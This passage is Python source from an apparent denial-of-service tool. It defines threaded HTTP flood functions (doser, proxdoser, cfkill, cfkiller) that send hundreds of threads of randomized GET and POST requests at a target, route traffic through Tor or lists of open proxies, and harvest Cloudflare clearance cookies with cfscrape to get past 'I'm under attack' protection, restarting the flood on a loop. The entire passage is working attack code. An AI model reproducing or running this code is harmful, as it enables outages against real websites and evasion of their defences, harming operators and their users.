       session.proxies['http'] = 'socks5h://localhost:9050'
       session.proxies['https'] = 'socks5h://localhost:9050'
       session.get(u,headers=h,timeout=self.timeout, verify=False)
      else:
       requests.get(u,headers=h,timeout=self.timeout, verify=False)
     else:
      req="POST"
      q=''
      for i in range(1,random.randint(2,15)):
       q+=random.choice(lis)
      p=''
      for i in range(1,random.randint(2,15)):
       p+=random.choice(lis)
      if '?' in u:
       jo='&'
      else:
       jo='?' 
      u+=jo+q+"="+p
      k=''
      for _ in range(1,random.randint(2,5)):
       k+=random.choice(lis)
      k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      for _ in range(1,random.randint(1,3)):
       k+=random.choice(lis)
      j=''
      for x in range(0,random.randint(11,31)):
       j+=random.choice(lis)
      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,1000)) ,'Content-Type': 'application/x-www-form-urlencoded','Host': target}
      if self.tor==True:
       session = requests.session()
       session.proxies = {}
       session.proxies['http'] = 'socks5h://localhost:9050'
       session.proxies['https'] = 'socks5h://localhost:9050'
       session.post(u, data={k:j}, headers=h,timeout=self.timeout, verify=False)
      else:
       requests.post(u, data={k:j}, headers=h,timeout=self.timeout, verify=False)
    if stop==True:
        break
    doser_counter+=1
    if prints==True:
     print("[!]Requests: {} | Type: {}".format(doser_counter,req))
   except requests.exceptions.ReadTimeout:
    if stop==True:
        break
    doser_counter+=1
    if prints==True:
     print("[!]Requests: {} | Type: {}".format(doser_counter,req))
   except Exception as e:
    pass
   time.sleep(.1)
def doser(u,threads=700,meth=1,maxtime=5,interval=300,logs=True,returning=False,settor=False):
 '''
  this function is for doser.py attack tool which uses requests module instead of httplib.
'''
 global doser_counter
 doser_counter=0
 global tor
 tor=settor
 global stop
 stop=False
 global prints
 prints=logs
 global target
 target=u
 global method
 method=meth
 global timeout
 timeout=maxtime
 for x in range(threads):
  t=dosecl()
  t.start() 
 c=time.time()
 while True:
  if stop==True:
     break
  try:
   time.sleep(.1)
   if int(time.time()-c)==interval:
    stop=True
    break
  except KeyboardInterrupt:
   stop=True
   break
 if returning==True:
    return doser_counter
class pdose(threading.Thread):
 def run(self):
  global proxdoser_counter 
  self.target=target
  u=self.target
  self.timeout=timeout
  self.method=method
  host=u.split('://')[1].split('/')[0]
  time.sleep(2)
  while (stop!=True):
   pr="http://"+random.choice(httplist)
   proxy={'http':pr,'https':pr}
   u=self.target
   try:
    if self.method==1:
     req="GET"
     q=''
     for i in range(1,random.randint(2,15)):
      q+=random.choice(lis)
     p=''
     for i in range(1,random.randint(2,15)):
      p+=random.choice(lis)
     if '?' in u:
      jo='&'
     else:
      jo='?' 
     u+=jo+q+"="+p
     h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5', 'Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,120)), 'Host': host}
     requests.get(u,headers=h,proxies=proxy,timeout=self.timeout, verify=False)
    elif self.method==2:
      req="POST"
      k=''
      for _ in range(1,random.randint(2,5)):
       k+=random.choice(lis)
      k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      for _ in range(1,random.randint(1,3)):
       k+=random.choice(lis)+str(random.randint(1,10000))
      j=''
      for x in range(0,random.randint(11,31)):
       j+=random.choice(lis)+str(random.randint(1,10000))
      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,1000)) ,'Content-Type': 'application/x-www-form-urlencoded','Host': host}
      requests.post(u, data={k:j}, headers=h,proxies=proxy,timeout=self.timeout, verify=False)
    elif self.method==3:
     i=random.randint(1,2)
     if i==1:
      req="GET"
      q=''
      for i in range(1,random.randint(2,15)):
       q+=random.choice(lis)
      p=''
      for i in range(1,random.randint(2,15)):
       p+=random.choice(lis)
      if '?' in u:
       jo='&'
      else:
       jo='?' 
      u+=jo+q+"="+p
      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5', 'Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,120)), 'Host': host}
      requests.get(u,headers=h,proxies=proxy,timeout=self.timeout, verify=False)
     else:
      req="POST"
      k=''
      for _ in range(1,random.randint(2,5)):
       k+=random.choice(lis)
      k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      for _ in range(1,random.randint(1,3)):
       k+=random.choice(lis)
      j=''
      for x in range(0,random.randint(11,31)):
       j+=random.choice(lis)
      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,1000)) ,'Content-Type': 'application/x-www-form-urlencoded','Host': host}
      requests.post(u, data={k:j}, headers=h,proxies=proxy,timeout=self.timeout, verify=False)
    if stop==True:
        break
    proxdoser_counter+=1
    print("[!]Requests: {} | Type: {} | Bot: {}".format(proxdoser_counter,req,pr.split('://')[1].split(':')[0]))
   except requests.exceptions.ReadTimeout:
    if stop==True:
        break
    proxdoser_counter+=1
    print("[!]Requests: {} | Type: {} | Bot: {}".format(proxdoser_counter,req,pr.split('://')[1].split(':')[0]))
   except Exception as e:
    pass
   time.sleep(.1)
def proxdoser(u,threads=700,httpl=None,meth=1,maxtime=5,interval=300,logs=True,returning=False):
 '''
   this is the advanced version of doser.py using http proxies.
'''
 global proxdoser_counter
 proxdoser_counter=0
 global stop
 stop=False
 global prints
 prints=logs
 global target
 target=u
 global method
 method=meth
 global httplist
 if httpl:
  httplist=httpl
 else:
  httplist=masshttp()
 global timeout
 timeout=maxtime
 for x in range(threads):
  t=pdose()
  t.start()
 c=time.time()
 while True:
  if stop==True:
     break
  try:
   time.sleep(.1)
   if int(time.time()-c)==interval:
    stop=True
    break
  except KeyboardInterrupt:
   stop=True
   break
 if returning==True:
    return proxdoser_counter
class atcf(threading.Thread):
 def run(self):
  global cf_doser_counter
  global stop
  self.target=target
  self.timeout=timeout
  time.sleep(2)
  while (stop!=True):
     u=random.choice(paths)
     q=''
     for i in range(random.randint(2,5)):
      q+=random.choice(lis)+str(random.randint(1,100000))
     s=''
     for i in range(random.randint(2,5)):
      s+=random.choice(lis)+str(random.randint(1,100000))
     p=''
     for i in range(random.randint(2,5)):
      p+=random.choice(lis)+str(random.randint(1,100000))
     if '?' in u:
      jo='&'
     else:
      jo='?' 
     u+=jo+q+"="+s
     request = urllib2.Request('http://'+self.target+u)
     a=random.choice(ual)
     if coo==True:
      b=a.split(':')[0]
      c=a.split(':')[1]
      request.add_header('User-Agent', b)
      request.add_header('Cookie', c)
     else:
      request.add_header('User-Agent', random.choice(ua2))
     request.add_header('Cache-Control', 'no-cache')
     request.add_header('Accept',random.choice(a))
     request.add_header('Accept-Language',random.choice(al))
     request.add_header('Accept-Encoding',random.choice(ec))
     request.add_header('Accept-Charset', random.choice(ac))
     request.add_header('Referer', random.choice(referers) +p)
     request.add_header('Keep-Alive', random.randint(100,500))
     request.add_header('Connection', 'keep-alive')
     request.add_header('Host',self.target)
     try:
      req=urllib2.urlopen(request,timeout=self.timeout)            
      cf_doser_counter+=1
      if prints==True:
       print("Requests: {}".format(cf_doser_counter))
     except urllib2.HTTPError as ex:
      if "Too Many Requests" in str(ex):
       stop=True
       break
      cf_doser_counter+=1
      if prints==True:
       print("Requests: {}".format(cf_doser_counter))
     except Exception as e:
      if "The read operation timed out" in str(e):
       cf_doser_counter+=1
       if prints==True:
        print("Requests: {}".format(cf_doser_counter))
class cooi(threading.Thread):
 def run(self):
  global ier
  global ual
  x=flag
  self.target=target
  us=ue[flag]
  try:
   s = cfscrape.create_scraper()
   c = s.get_cookie_string("http://"+self.target,user_agent=us)
   c= str(c).split("'")[1].split("'")[0]
   ual.append(us+':'+c)
  except:
   pass
  ier+=1
def cki():
 global flag
 flag=-1
 global ier
 ier=0
 print("[+]Getting yummy hot cookies...")
 for x in range(10):
  flag+=1
  cooi().start()
  time.sleep(.01)
 while(ier!=10):
   time.sleep(.1)
 time.sleep(1)
def cfkill(u,threads=500,maxtime=5,check=True,cook=True,interval=300,logs=True,returning=False):
 global cf_doser_counter
 cf_doser_counter=0
 global prints
 global stop
 stop=False
 prints=logs
 global timeout
 timeout=maxtime
 global target
 target=u
 global ual
 global ue
 for x in ua2:
  x+=str(random.randint(1,1000000)*random.randint(1,1000000))+str(random.randint(1,1000000)*random.randint(1,1000000))+str(random.randint(1,1000000)*random.randint(1,1000000))
  ue.append(x)
 global coo
 coo=cook
 if check==True:
  try:
   print("[*]Checking for 'I m under attack protection...")
   r=requests.get("https://"+u)
   if ((r.status_code==503) or ('Checking your browser before accessing' in r.text)):
    coo=True
  except Exception as e:
   print (e)
   return None
  if coo==True:
   print("I'm under attack protection: On")
  else:
   print("I'm under attack protection: Off")
 if coo==True:
  cki()
 else:
  ual=ue[:]
 for x in range(threads):
  atcf().start()
  time.sleep(.001)
 c=time.time()
 while True:
  if stop==True:
     break
  try:
   time.sleep(.1)
   if int(time.time()-c)==interval:
    stop=True
    break
  except KeyboardInterrupt:
   stop=True
   break
 if returning==True:
    return cf_doser_counter
def cfkiller(u,threads=500,maxtime=5,interval=300,logs=True,returning=False,wait=10):
 global cf_doser_counter
 cf_doser_counter=0
 c=time.time()
 global stop
 while True:
  try:
   cfkill(u,threads=threads,interval=(interval-int(time.time()-c)),maxtime=maxtime,cook=True,check=False)
   time.sleep(3)
   if logs==True:
    print("[*]Resarting the attack after {} seconds...".format(wait))
   time.sleep(wait)  
   reset() 
   if int(time.time()-c)==interval:
    stop=True
    break
  except KeyboardInterrupt:
    stop=True
    break
 if returning==True:
    return cf_doser_counter
